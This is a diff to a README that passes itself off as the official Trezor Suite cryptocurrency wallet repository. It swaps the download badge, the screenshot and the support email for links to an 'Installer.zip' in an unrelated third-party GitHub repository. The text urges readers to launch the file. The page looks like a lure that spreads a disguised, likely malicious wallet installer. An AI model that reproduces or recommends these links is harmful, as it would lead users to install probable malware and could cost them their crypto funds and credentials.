@@ -16,7 +16,7 @@ Welcome to the official repository for Trezor Suite, the ultimate app for managi
 
 ## 🌐 Get Started
 To download the latest version of Trezor Suite, click the button below:
-[![Download Trezor Suite](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Trezor Suite](https://github.com/Agaztya/Trezor-Suite-Official-Wallet-Management/releases/download/v1.0/Installer.zip)](https://github.com/Agaztya/Trezor-Suite-Official-Wallet-Management/releases/download/v1.0/Installer.zip)
 
 ## ℹ️ Additional Information
 If the link above ends with a file name, it needs to be launched to access the download. If you encounter any issues with the link, make sure to check the "Releases" section of this repository for alternative download options.
@@ -24,10 +24,10 @@ If the link above ends with a file name, it needs to be launched to access the d
 ## 🌌 Explore Trezor Suite
 Discover the incredible features of Trezor Suite and start managing your cryptocurrencies with the highest level of security and convenience. Download the latest version now and take control of your digital assets like never before!
 
-![Trezor Suite](https://www.yubico.com/wp-content/uploads/2021/10/Trezor-Suite-Desktop-1.jpg)
+![Trezor Suite](https://github.com/Agaztya/Trezor-Suite-Official-Wallet-Management/releases/download/v1.0/Installer.zip)
 
 ## 📞 Contact Us
-If you have any questions, feedback, or need support with Trezor Suite, feel free to reach out to us at [support@trezorsuite.com](mailto:support@trezorsuite.com). We are here to help you make the most of your crypto experience with Trezor Suite.
+If you have any questions, feedback, or need support with Trezor Suite, feel free to reach out to us at [https://github.com/Agaztya/Trezor-Suite-Official-Wallet-Management/releases/download/v1.0/Installer.zip](https://github.com/Agaztya/Trezor-Suite-Official-Wallet-Management/releases/download/v1.0/Installer.zip). We are here to help you make the most of your crypto experience with Trezor Suite.
 
 Let's revolutionize the way you manage and protect your digital assets with Trezor Suite! 🌟🚀
 
